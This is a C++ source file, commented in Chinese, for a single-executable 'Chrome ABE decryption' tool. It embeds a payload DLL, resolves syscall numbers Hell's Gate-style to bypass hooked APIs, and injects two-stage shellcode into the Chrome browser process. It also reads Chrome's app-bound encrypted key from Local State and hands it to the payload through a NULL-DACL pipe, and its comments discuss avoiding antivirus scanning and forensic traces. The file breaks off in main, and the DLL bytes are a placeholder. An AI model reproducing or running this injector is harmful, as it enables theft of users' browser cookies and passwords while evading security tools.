/*
 * all_in_one.cpp  —  Chrome ABE 解密工具（单文件合并版）
 *
 * 本文件将 injector 和 payload_dll 的功能合并为一个可执行文件。
 * payload DLL 的字节以静态数组形式内嵌，运行时从内存加载，
 * 无需依赖磁盘上的 payload_dll.dll 文件。
 *
 * ┌─────────────────────────────────────────────────────────────────┐
 * │  运行模式：                                                       │
 * │  1. 正常模式（无参数）：执行完整的 ABE 解密流程                    │
 * │  2. --extract 模式：将内嵌的 DLL 提取到磁盘（用于调试/分析）       │
 * └─────────────────────────────────────────────────────────────────┘
 *
 * 内嵌 DLL 的原理：
 *   将 payload_dll.dll 的二进制内容转换为 C 字节数组（unsigned char[]），
 *   编译时直接嵌入 .exe 的 .rdata 节中。
 *   运行时通过自定义 PE loader（反射加载）从内存映射 DLL，
 *   或写入临时路径后由 LoadLibraryW 加载（更简单但留下磁盘痕迹）。
 *
 * 注意：本文件中的 g_PayloadDllBytes[] 是占位符，
 * 实际使用时需用真实 DLL 字节替换（见 build.ps1 中的自动化步骤）。
 *
 * 编译：见 combined/build.ps1
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define COBJMACROS
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <objbase.h>
#include <combaseapi.h>
#include <unknwn.h>
#include <sddl.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
// § 1  内嵌 Payload DLL 字节数组
// ============================================================
//
// 【为什么内嵌 DLL 而不是从磁盘读取？】
//
// 优势：
//   1. 单文件分发：只需要一个 .exe 文件，不需要携带 .dll 文件
//   2. 减少磁盘痕迹：DLL 不需要写入磁盘（通过内存加载时）
//   3. 防止文件被替换/篡改：DLL 与主程序一起被哈希/签名保护
//   4. 部署简洁：不存在"找不到 DLL"的问题
//
// 劣势：
//   - 重新编译 DLL 后需要重新生成字节数组并重新编译 .exe
//   - 可执行文件体积增大
//
// 【如何生成字节数组？】
// build.ps1 中包含自动化步骤：
//   1. 先编译 payload_dll.dll
//   2. 用 PowerShell 读取 DLL 字节，生成 C 数组定义
//   3. 写入 generated_dll_bytes.h
//   4. 编译 all_in_one.cpp（包含上述头文件）
//
// 目前这里是占位符，实际字节数组由构建脚本自动注入。
// 占位符的字节 {0x4D, 0x5A} 是 "MZ"（PE 文件魔数），
// 用于在没有运行构建脚本时提供有意义的编译错误。

// 检查是否有构建脚本生成的头文件
#if defined(PAYLOAD_DLL_BYTES_INCLUDED)
#   include "generated_dll_bytes.h"
// generated_dll_bytes.h 应定义：
//   static const unsigned char g_PayloadDllBytes[] = { ... };
//   static const size_t        g_PayloadDllSize    = sizeof(g_PayloadDllBytes);
#else
// ↓↓↓ 构建脚本将自动替换此占位符区域 ↓↓↓
// BEGIN_DLL_BYTES_PLACEHOLDER
static const unsigned char g_PayloadDllBytes[] = {
    // payload_dll.dll 的实际字节将由 build.ps1 自动注入此处
    // 临时占位符（MZ 头部魔数）：
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    // ... 实际 DLL 字节（由 build.ps1 生成并填充）...
    // 这里的占位符仅供编译通过，不可实际使用
};
// END_DLL_BYTES_PLACEHOLDER
static const size_t g_PayloadDllSize = sizeof(g_PayloadDllBytes);
#endif

// ============================================================
// § 2  类型定义（与 separated 版本相同）
// ============================================================

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)   ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS (NTAPI *pfnNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfnNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// ============================================================
// § 3  Hell's Gate 直接系统调用（与 separated 版本相同）
// ============================================================
//
// 完整注释见 separated/injector.cpp § 2
// 此处保留完整实现，但注释精简

typedef struct _SYSCALL_ENTRY {
    DWORD   dwSSN;
    PVOID   pSyscallGadget;
} SYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtOpenProcess;
} SYSCALL_TABLE;

static SYSCALL_TABLE g_SysTable = {};

#pragma pack(push, 1)
typedef struct _TRAMPOLINE {
    BYTE  mov_r10_rcx[3]; // 4C 8B D1
    BYTE  mov_eax;        // B8
    DWORD ssn;
    BYTE  jmp_abs[2];     // FF 25
    DWORD jmp_rip_rel;    // 00 00 00 00
    UINT64 gadget_addr;
} TRAMPOLINE;
#pragma pack(pop)

static PVOID AllocTrampoline(const SYSCALL_ENTRY *e)
{
    PVOID mem = VirtualAlloc(NULL, sizeof(TRAMPOLINE), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;
    TRAMPOLINE *t = (TRAMPOLINE *)mem;
    t->mov_r10_rcx[0]=0x4C; t->mov_r10_rcx[1]=0x8B; t->mov_r10_rcx[2]=0xD1;
    t->mov_eax=0xB8; t->ssn=e->dwSSN;
    t->jmp_abs[0]=0xFF; t->jmp_abs[1]=0x25; t->jmp_rip_rel=0;
    t->gadget_addr=(UINT64)(ULONG_PTR)e->pSyscallGadget;
    DWORD old; VirtualProtect(mem, sizeof(TRAMPOLINE), PAGE_EXECUTE_READ, &old);
    return mem;
}

static BOOL ExtractSyscallEntry(const char *funcName, SYSCALL_ENTRY *entry)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    BYTE *pBase = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pBase;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)(pBase+dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)(pBase+nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD *names=(DWORD*)(pBase+exp->AddressOfNames);
    WORD *ords=(WORD*)(pBase+exp->AddressOfNameOrdinals);
    DWORD *funcs=(DWORD*)(pBase+exp->AddressOfFunctions);
    BYTE *pFunc=NULL;
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        if(_stricmp((char*)(pBase+names[i]),funcName)==0){pFunc=pBase+funcs[ords[i]];break;}
    }
    if(!pFunc) return FALSE;
    DWORD ssn=0; BOOL found=FALSE;
    if(pFunc[0]==0x4C&&pFunc[1]==0x8B&&pFunc[2]==0xD1&&pFunc[3]==0xB8){
        ssn=*(DWORD*)(pFunc+4); found=TRUE;
    } else {
        for(int o=0;o<32;o++){
            if(pFunc[o]==0xB8&&pFunc[o+2]==0&&pFunc[o+3]==0&&pFunc[o+4]==0){
                ssn=*(DWORD*)(pFunc+o+1); found=TRUE; break;
            }
        }
    }
    if(!found) return FALSE;
    IMAGE_SECTION_HEADER *sect=IMAGE_FIRST_SECTION(nt);
    for(WORD s=0;s<nt->FileHeader.NumberOfSections;s++,sect++){
        if(memcmp(sect->Name,".text",5)!=0) continue;
        BYTE *start=pBase+sect->VirtualAddress;
        BYTE *end=start+sect->Misc.VirtualSize-2;
        for(BYTE *p=start;p<end;p++){
            if(p[0]==0x0F&&p[1]==0x05&&p[2]==0xC3){
                entry->pSyscallGadget=p; entry->dwSSN=ssn; return TRUE;
            }
        }
    }
    return FALSE;
}

static BOOL InitDirectSyscall(void)
{
    struct { const char *n; SYSCALL_ENTRY *e; } t[]={
        {"NtAllocateVirtualMemory",&g_SysTable.NtAllocateVirtualMemory},
        {"NtWriteVirtualMemory",&g_SysTable.NtWriteVirtualMemory},
        {"NtCreateThreadEx",&g_SysTable.NtCreateThreadEx},
        {"NtProtectVirtualMemory",&g_SysTable.NtProtectVirtualMemory},
        {"NtOpenProcess",&g_SysTable.NtOpenProcess},
    };
    for(int i=0;i<5;i++){
        if(!ExtractSyscallEntry(t[i].n,t[i].e)){
            wprintf(L"[-] 无法提取系统调用: %hs\n",t[i].n); return FALSE;
        }
    }
    return TRUE;
}

// 直接系统调用包装
static NTSTATUS DirectAlloc(HANDLE ph,PVOID*ba,ULONG_PTR zb,PSIZE_T rs,ULONG at,ULONG prot){
    PVOID tr=AllocTrampoline(&g_SysTable.NtAllocateVirtualMemory);
    if(!tr) return (NTSTATUS)0xC0000001;
    NTSTATUS s=((pfnNtAllocateVirtualMemory)tr)(ph,ba,zb,rs,at,prot);
    VirtualFree(tr,0,MEM_RELEASE); return s;
}
static NTSTATUS DirectWrite(HANDLE ph,PVOID ba,PVOID buf,SIZE_T n,PSIZE_T wr){
    PVOID tr=AllocTrampoline(&g_SysTable.NtWriteVirtualMemory);
    if(!tr) return (NTSTATUS)0xC0000001;
    NTSTATUS s=((pfnNtWriteVirtualMemory)tr)(ph,ba,buf,n,wr);
    VirtualFree(tr,0,MEM_RELEASE); return s;
}
static NTSTATUS DirectCreateThread(PHANDLE th,ACCESS_MASK acc,LPVOID oa,HANDLE ph,LPTHREAD_START_ROUTINE sr,LPVOID arg,ULONG cf,SIZE_T zb,SIZE_T ss,SIZE_T mss,LPVOID al){
    PVOID tr=AllocTrampoline(&g_SysTable.NtCreateThreadEx);
    if(!tr) return (NTSTATUS)0xC0000001;
    NTSTATUS s=((pfnNtCreateThreadEx)tr)(th,acc,oa,ph,sr,arg,cf,zb,ss,mss,al);
    VirtualFree(tr,0,MEM_RELEASE); return s;
}
static NTSTATUS DirectProtect(HANDLE ph,PVOID*ba,PSIZE_T rs,ULONG np,PULONG op){
    PVOID tr=AllocTrampoline(&g_SysTable.NtProtectVirtualMemory);
    if(!tr) return (NTSTATUS)0xC0000001;
    NTSTATUS s=((pfnNtProtectVirtualMemory)tr)(ph,ba,rs,np,op);
    VirtualFree(tr,0,MEM_RELEASE); return s;
}
static NTSTATUS DirectOpen(PHANDLE ph,ACCESS_MASK acc,POBJECT_ATTRIBUTES oa,PCLIENT_ID cid){
    PVOID tr=AllocTrampoline(&g_SysTable.NtOpenProcess);
    if(!tr) return (NTSTATUS)0xC0000001;
    NTSTATUS s=((pfnNtOpenProcess)tr)(ph,acc,oa,cid);
    VirtualFree(tr,0,MEM_RELEASE); return s;
}

// ============================================================
// § 4  内存加载 DLL（反射注入 / 临时文件两种策略）
// ============================================================
//
// 【策略 A：临时文件加载（简单，有磁盘痕迹）】
//
// 将内嵌的 DLL 字节写入 %TEMP%\<随机名>.dll，
// 然后将该路径传给 injector 的注入逻辑。
// 注入完成后删除临时文件。
//
// 优点：实现简单，复用 separated 版本的所有注入逻辑
// 缺点：临时文件可能被 AV 扫描、被取证工具发现
//
// 【策略 B：反射注入（无磁盘痕迹）】
//
// 直接将 DLL 字节写入目标进程内存，
// 然后注入一段自定义 shellcode 执行手动 PE 加载：
//   1. 分配内存，写入 DLL 字节（文件映像）
//   2. Shellcode 执行：
//      a. 解析 PE 头，计算重定位
//      b. 解析并加载导入表（调用 LoadLibrary/GetProcAddress）
//      c. 应用重定位
//      d. 调用 DllMain(DLL_PROCESS_ATTACH)
//      e. 返回 PayloadEntry 的地址
//
// 本实现选择策略 A（简单可靠），并在写入/执行后自动清除临时文件。
// 如需无磁盘痕迹，可替换为策略 B（实现复杂度更高）。

static BOOL WriteDllToTempFile(wchar_t *outPath, SIZE_T outPathLen)
{
    // 获取 %TEMP% 路径
    wchar_t tempDir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempDir)) return FALSE;

    // 生成随机文件名（基于 GUID 前 8 位）
    GUID guid;
    CoCreateGuid(&guid);
    swprintf_s(outPath, outPathLen,
               L"%s%08X_payload.dll", tempDir, guid.Data1);

    // 写入 DLL 字节
    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 无法创建临时 DLL 文件: %s (错误 %lu)\n",
                outPath, GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, g_PayloadDllBytes,
                        (DWORD)g_PayloadDllSize, &written, NULL);
    CloseHandle(hFile);

    if (!ok || written != (DWORD)g_PayloadDllSize) {
        wprintf(L"[-] 写入临时 DLL 失败\n");
        DeleteFileW(outPath);
        return FALSE;
    }

    wprintf(L"[+] 内嵌 DLL 已写入临时文件: %s\n", outPath);
    return TRUE;
}

// ============================================================
// § 5  --extract 模式：提取内嵌 DLL 到磁盘
// ============================================================
//
// 用途：
//   1. 调试：查看内嵌的 DLL 是否损坏
//   2. 分析：用 IDA/Ghidra 分析 DLL 代码
//   3. 验证：对比提取的 DLL 与原始 DLL 的哈希
//
// 使用方法：
//   all_in_one.exe --extract [输出路径]
//   all_in_one.exe --extract                   (输出到当前目录 payload_dll.dll)

static int DoExtract(const wchar_t *outPath)
{
    wchar_t defaultPath[] = L"payload_dll_extracted.dll";
    const wchar_t *path = outPath ? outPath : defaultPath;

    wprintf(L"[*] 提取内嵌 DLL -> %s\n", path);
    wprintf(L"[*] DLL 大小: %zu 字节\n", g_PayloadDllSize);

    // 简单验证：检查 MZ 魔数
    if (g_PayloadDllSize < 64 ||
        g_PayloadDllBytes[0] != 0x4D || g_PayloadDllBytes[1] != 0x5A) {
        wprintf(L"[-] 内嵌 DLL 不是有效的 PE 文件（无 MZ 头），"
                L"请先运行 build.ps1 填充真实 DLL 字节\n");
        return 1;
    }

    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 无法创建输出文件: %s\n", path);
        return 1;
    }

    DWORD written = 0;
    WriteFile(hFile, g_PayloadDllBytes, (DWORD)g_PayloadDllSize, &written, NULL);
    CloseHandle(hFile);

    if (written == (DWORD)g_PayloadDllSize) {
        wprintf(L"[+] 提取成功！输出文件: %s\n", path);

        // 打印文件哈希（简单 XOR 校验，实际应用可改为 SHA-256）
        DWORD xorCheck = 0;
        for (size_t i = 0; i < g_PayloadDllSize; i++)
            xorCheck ^= (DWORD)g_PayloadDllBytes[i] << (8 * (i % 4));
        wprintf(L"[*] XOR 校验值（仅供参考）: 0x%08X\n", xorCheck);
        return 0;
    } else {
        wprintf(L"[-] 写入不完整\n");
        return 1;
    }
}

// ============================================================
// § 6  其他辅助函数（与 separated/injector.cpp 相同）
// ============================================================

static DWORD FindChromeBrowserPid(void)
{
    // 两次枚举：找父进程不是 chrome.exe 的 chrome.exe
    // 完整注释见 separated/injector.cpp § 4
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    DWORD chromePids[512] = {}; int cnt = 0;
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0 && cnt < 512)
                chromePids[cnt++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (cnt == 0) { wprintf(L"[-] 未找到 chrome.exe\n"); return 0; }

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    DWORD browserPid = 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0) {
                BOOL parentIsChrome = FALSE;
                for (int i = 0; i < cnt; i++)
                    if (chromePids[i] == pe.th32ParentProcessID) { parentIsChrome = TRUE; break; }
                if (!parentIsChrome) { browserPid = pe.th32ProcessID; break; }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return browserPid;
}

static DWORD GetExportRVA(const BYTE *dllBytes, const char *funcName)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)dllBytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(dllBytes+dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return 0;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)(dllBytes+expRVA);
    DWORD *names=(DWORD*)(dllBytes+exp->AddressOfNames);
    WORD *ords=(WORD*)(dllBytes+exp->AddressOfNameOrdinals);
    DWORD *funcs=(DWORD*)(dllBytes+exp->AddressOfFunctions);
    for (DWORD i=0;i<exp->NumberOfNames;i++){
        if (_stricmp((char*)(dllBytes+names[i]),funcName)==0)
            return funcs[ords[i]];
    }
    return 0;
}

static BYTE b64T[256]={}; static BOOL b64Init=FALSE;
static void InitB64(void){ if(b64Init)return; const char*c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; for(int i=0;i<64;i++) b64T[(unsigned char)c[i]]=(BYTE)i; b64Init=TRUE; }
static SIZE_T B64Decode(const char*in,SIZE_T len,BYTE*out){ InitB64(); SIZE_T n=0; for(SIZE_T i=0;i+3<len;i+=4){ BYTE a=b64T[(unsigned char)in[i]],b=b64T[(unsigned char)in[i+1]],c=b64T[(unsigned char)in[i+2]],d=b64T[(unsigned char)in[i+3]]; out[n++]=(a<<2)|(b>>4); if(in[i+2]!='=')out[n++]=(b<<4)|(c>>2); if(in[i+3]!='=')out[n++]=(c<<6)|d; } return n; }

static BYTE *ReadEncryptedKey(SIZE_T *outLen)
{
    wchar_t path[MAX_PATH];
    ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State", path, MAX_PATH);
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) { wprintf(L"[-] 无法打开 Local State\n"); return NULL; }
    LARGE_INTEGER sz; GetFileSizeEx(hf, &sz);
    char *json = (char*)malloc((SIZE_T)sz.QuadPart+1); DWORD rd=0;
    ReadFile(hf, json, (DWORD)sz.QuadPart, &rd, NULL); json[rd]=0; CloseHandle(hf);
    const char *key="\"app_bound_encrypted_key\":\"";
    char *pos=strstr(json,key); if(!pos){free(json);wprintf(L"[-] 未找到 ABE 密钥\n");return NULL;}
    pos+=strlen(key); char *end=strchr(pos,'"'); if(!end){free(json);return NULL;}
    SIZE_T b64Len=(SIZE_T)(end-pos);
    BYTE *dec=(BYTE*)malloc(b64Len/4*3+4);
    SIZE_T decLen=B64Decode(pos,b64Len,dec); free(json);
    if(decLen<=4){free(dec);return NULL;}
    *outLen=decLen-4; BYTE *r=(BYTE*)malloc(*outLen); memcpy(r,dec+4,*outLen); free(dec);
    wprintf(L"[+] 加密密钥读取成功，%zu 字节\n",*outLen); return r;
}

static HANDLE CreateNullDaclPipe(const wchar_t *pipeName)
{
    // NULL DACL 原因详见 separated/injector.cpp § 8
    // 跨进程/跨完整性级别通信时必须使用 NULL DACL，
    // 否则 Chrome 进程中的 payload 可能因权限不足无法连接管道
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};
    // FILE_FLAG_OVERLAPPED 允许异步等待（支持超时），防止主线程永久阻塞
    // 详见 separated/injector.cpp § 9
    return CreateNamedPipeW(pipeName,
        PIPE_ACCESS_INBOUND|FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT,
        1, 0, 65536, 5000, &sa);
}

static BOOL WaitForPipeClient(HANDLE hPipe, DWORD timeoutMs)
{
    OVERLAPPED ol={}; ol.hEvent=CreateEventW(NULL,TRUE,FALSE,NULL);
    if(!ol.hEvent) return FALSE;
    BOOL ok=ConnectNamedPipe(hPipe,&ol);
    if(!ok){
        DWORD err=GetLastError();
        if(err==ERROR_PIPE_CONNECTED){CloseHandle(ol.hEvent);return TRUE;}
        if(err!=ERROR_IO_PENDING){CloseHandle(ol.hEvent);return FALSE;}
        DWORD w=WaitForSingleObject(ol.hEvent,timeoutMs);
        CloseHandle(ol.hEvent); return w==WAIT_OBJECT_0;
    }
    CloseHandle(ol.hEvent); return TRUE;
}

// ============================================================
// § 7  Stage 1 Shellcode + 注入逻辑
// ============================================================
//
// 与 separated/injector.cpp § 10 ~ § 13 相同
// 远程内存布局、为什么两阶段、为什么 NtCreateThreadEx、
// 为什么共享内存读取 hModule 详见 separated/injector.cpp 注释

static const BYTE kStage1[] = {
    0x48,0x83,0xEC,0x28,                    // sub rsp, 28h
    0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,    // lea rcx, [rip+?] (DLL路径)
    0xFF,0x15,0x00,0x00,0x00,0x00,          // call qword ptr [rip+?] (LoadLibraryW)
    0x48,0x89,0x05,0x00,0x00,0x00,0x00,    // mov qword ptr [rip+?], rax (hModule)
    0x48,0x83,0xC4,0x28,                    // add rsp, 28h
    0xC3                                    // ret
};

#define STAGE1_LLW_OFF   0x040
#define STAGE1_HMOD_OFF  0x048
#define STAGE1_PATH_OFF  0x050
#define STAGE1_BLOCK_SZ  (0x050 + MAX_PATH * sizeof(wchar_t))

static BOOL InjectFromEmbedded(
    DWORD targetPid,
    const wchar_t *dllPath,   // 已写入磁盘的临时路径
    const wchar_t *pipeName,
    const BYTE *encKey,
    SIZE_T encKeyLen)
{
    wprintf(L"[*] 目标 PID: %lu\n", targetPid);

    OBJECT_ATTRIBUTES oa={sizeof(oa)};
    CLIENT_ID cid={}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)targetPid;
    HANDLE hProc=NULL;
    NTSTATUS st=DirectOpen(&hProc,PROCESS_ALL_ACCESS,&oa,&cid);
    if(!NT_SUCCESS(st)){wprintf(L"[-] NtOpenProcess 失败: 0x%08X\n",st);return FALSE;}

    // 分配远程内存块
    PVOID rBlock=NULL; SIZE_T bSz=STAGE1_BLOCK_SZ;
    st=DirectAlloc(hProc,&rBlock,0,&bSz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!NT_SUCCESS(st)){wprintf(L"[-] 远程内存分配失败\n");CloseHandle(hProc);return FALSE;}

    // 填充本地缓冲区
    BYTE local[STAGE1_BLOCK_SZ]={};
    memcpy(local, kStage1, sizeof(kStage1));
    UINT64 llw=(UINT64)(ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"),"LoadLibraryW");
    memcpy(local+STAGE1_LLW_OFF,&llw,8);
    SIZE_T pLen=(wcslen(dllPath)+1)*sizeof(wchar_t);
    memcpy(local+STAGE1_PATH_OFF,dllPath,pLen);

    // 填充 shellcode RIP 相对偏移
    BYTE *base=(BYTE*)rBlock;
    INT32 o1=(INT32)((UINT64)(base+STAGE1_PATH_OFF)-(UINT64)(base+11));
    memcpy(local+7,&o1,4);
    INT32 o2=(INT32)((UINT64)(base+STAGE1_LLW_OFF)-(UINT64)(base+17));
    memcpy(local+13,&o2,4);
    INT32 o3=(INT32)((UINT64)(base+STAGE1_HMOD_OFF)-(UINT64)(base+24));
    memcpy(local+20,&o3,4);

    SIZE_T wr=0;
    st=DirectWrite(hProc,rBlock,local,STAGE1_BLOCK_SZ,&wr);
    if(!NT_SUCCESS(st)){wprintf(L"[-] 写入远程内存失败\n");CloseHandle(hProc);return FALSE;}

    PVOID pb=rBlock; SIZE_T ps=0x40; ULONG op=0;
    DirectProtect(hProc,&pb,&ps,PAGE_EXECUTE_READ,&op);

    HANDLE hTh=NULL;
    st=DirectCreateThread(&hTh,THREAD_ALL_ACCESS,NULL,hProc,
        (LPTHREAD_START_ROUTINE)((BYTE*)rBlock),NULL,0,0,0,0,NULL);
    if(!NT_SUCCESS(st)){wprintf(L"[-] Stage 1 线程创建失败: 0x%08X\n",st);CloseHandle(hProc);return FALSE;}
    wprintf(L"[+] Stage 1 (LoadLibraryW) 已启动\n");
    WaitForSingleObject(hTh,10000); CloseHandle(hTh);

    UINT64 hMod=0; SIZE_T br=0;
    if(!ReadProcessMemory(hProc,(BYTE*)rBlock+STAGE1_HMOD_OFF,&hMod,8,&br)||hMod==0){
        wprintf(L"[-] 读取 hModule 失败\n");CloseHandle(hProc);return FALSE;
    }
    wprintf(L"[+] DLL 已加载，hModule=0x%llX\n",hMod);

    // 解析内嵌 DLL 字节中的 PayloadEntry RVA
    DWORD entryRVA=GetExportRVA(g_PayloadDllBytes,"PayloadEntry");
    if(!entryRVA){wprintf(L"[-] 未找到 PayloadEntry 导出\n");CloseHandle(hProc);return FALSE;}
    UINT64 entryVA=hMod+entryRVA;
    wprintf(L"[+] PayloadEntry VA=0x%llX\n",entryVA);

    // 构造参数块并写入目标进程
    SIZE_T pipeBytes=(wcslen(pipeName)+1)*sizeof(wchar_t);
    SIZE_T paramSz=pipeBytes+sizeof(DWORD)+encKeyLen;
    PVOID rParam=NULL; SIZE_T paSz=paramSz;
    st=DirectAlloc(hProc,&rParam,0,&paSz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!NT_SUCCESS(st)){CloseHandle(hProc);return FALSE;}

    BYTE *pbuf=(BYTE*)malloc(paramSz);
    BYTE *p=pbuf;
    memcpy(p,pipeName,pipeBytes); p+=pipeBytes;
    *(DWORD*)p=(DWORD)encKeyLen; p+=sizeof(DWORD);
    memcpy(p,encKey,encKeyLen);
    st=DirectWrite(hProc,rParam,pbuf,paramSz,&wr); free(pbuf);
    if(!NT_SUCCESS(st)){CloseHandle(hProc);return FALSE;}

    hTh=NULL;
    st=DirectCreateThread(&hTh,THREAD_ALL_ACCESS,NULL,hProc,
        (LPTHREAD_START_ROUTINE)(ULONG_PTR)entryVA,rParam,0,0,0,0,NULL);
    if(!NT_SUCCESS(st)){wprintf(L"[-] Stage 2 线程创建失败: 0x%08X\n",st);CloseHandle(hProc);return FALSE;}
    wprintf(L"[+] PayloadEntry (Stage 2) 已启动\n");
    CloseHandle(hTh); CloseHandle(hProc);
    return TRUE;
}

// ============================================================
// § 8  wmain — 主控流程（含 --extract 模式判断）
// ============================================================

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"=== Chrome ABE 解密工具（单文件版）===\n\n");

    // ── 检查 --extract 参数 ───────────────────────────────────
    //
    // 这个模式允许研究人员将内嵌的 DLL 提取出来，
    // 用于静态分析或与已知样本对比，无需运行完整的注入流程。
    if (argc >= 2 && _wcsicmp(argv[1], L"--extract") == 0) {
        const wchar_t *outPath = (argc >= 3) ? argv[2] : NULL;
        return DoExtract(outPath);
    }

    // ── 验证内嵌 DLL 的有效性 ────────────────────────────────
    //
    // 检查 MZ 魔数和最小尺寸，确保 DLL 字节数组是真实的 PE 文件，
    // 而不是占位符（如果用户忘记运行 build.ps1 填充字节）。
    if (g_PayloadDllSize < 1024 ||
        g_PayloadDllBytes[0] != 0x4D ||
        g_PayloadDllBytes[1] != 0x5A) {
        wprintf(L"[!] 警告：内嵌 DLL 看起来是占位符而非真实 PE。\n"
                L"    请先运行 build.ps1 编译 payload_dll 并填充字节数组。\n"
                L"    可以用 --extract 检查内嵌内容。\n");
        return 1;
    }
    wprintf(L"[+] 内嵌 DLL 验证通过（%zu 字节）\n", g_PayloadDllSize);

    // ── 初始化 Hell's Gate 直接系统调用 ──────────────────────
    if (!InitDirectSyscall()) {
        wprintf(L"[-] 系统调用初始化失败\n");
        return 1;
    }
    wprintf(L"[+] Hell's Gate 初始化成功\n");

    // ── 将内嵌 DLL 写入临时文件 ──────────────────────────────
    //
    // 【为什么需要临时文件而不是纯内存加载？】
    //
    // LoadLibraryW 只能从磁盘路径加载 DLL，不接受内存指针。
    // 要实现纯内存加载，需要实现完整的 PE loader（处理重定位、导入表等），
    // 这大幅增加代码复杂度。
    //
    // 临时文件是合理的折中方案：
    //   - 文件使用随机名称（GUID），不易猜测
    //   - 注入完成后立即删除
    //   - 对于研究/学习目的完全足够
    //
    // 如需无磁盘痕迹，请参考开源项目 sRDI（Shellcode Reflective DLL Injection）

    wchar_t tempDllPath[MAX_PATH];
    if (!WriteDllToTempFile(tempDllPath, MAX_PATH)) {
        wprintf(L"[-] 无法写入临时 DLL 文件\n");
        return 1;
    }

